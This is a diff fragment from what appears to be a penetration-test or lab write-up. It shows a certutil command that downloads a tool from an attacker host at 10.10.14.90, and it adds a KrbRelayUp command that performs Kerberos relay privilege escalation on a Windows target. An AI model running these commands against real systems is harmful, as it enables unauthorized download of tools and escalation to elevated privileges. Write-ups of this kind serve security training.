@@ -418,6 +418,6 @@ PS C:\Users\svc_scan\Documents> certutil -urlcache -split -f http://10.10.14.90:
 This transferred this to the target
 
 ```python
-
+./KrbRelayUp.exe full -m rbcd -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3}
 ```
 
